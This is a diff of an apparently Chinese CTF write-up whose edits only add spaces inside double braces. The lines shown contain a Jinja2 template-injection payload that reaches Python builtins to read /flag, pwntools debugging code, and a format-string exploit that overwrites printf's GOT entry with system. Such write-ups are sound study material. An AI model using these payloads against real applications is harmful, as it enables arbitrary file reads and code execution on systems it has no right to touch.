@@ -174,7 +174,7 @@ http://101.133.134.12:8005/
 通过内置模块获取open函数打开/flag并通过read得到文件内容
 
 ```
-{{''.__class__.__mro__[-1].__subclasses__()[64].__init__.__globals__.__builtins__.open('/flag','r').read() }}
+{ {''.__class__.__mro__[-1].__subclasses__()[64].__init__.__globals__.__builtins__.open('/flag','r').read() } }
 ```
 
 变化一下就是
@@ -639,7 +639,7 @@ def debug(breakpoint=''):
     gdbscript += 'directory %sstdio-common/\n' % glibc_dir
     gdbscript += 'directory %sstdlib/\n' % glibc_dir
     gdbscript += 'directory %slibio/\n' % glibc_dir
-    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
+    elf_base = int(os.popen('pmap {}| awk \x27{ {print \x241} }\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
@@ -706,6 +706,7 @@ sea('Say something.\n',(fmtstr_payload(8,{(elf.got['printf']):system_addr,(0x600
 p.interactive()
 ```
 
+
 ![image-20220608114145159](https://res.cloudinary.com/sycamore/image/upload/v1682444669/Typera/2023/04/d26beea959cbaa17cbecb1d5b70d5514.png)
 
 ### orw_h2
@@ -747,7 +748,7 @@ def debug(breakpoint=''):
     gdbscript += 'directory %sstdio-common/\n' % glibc_dir
     gdbscript += 'directory %sstdlib/\n' % glibc_dir
     gdbscript += 'directory %slibio/\n' % glibc_dir
-    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
+    elf_base = int(os.popen('pmap {}| awk \x27{ {print \x241} }\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
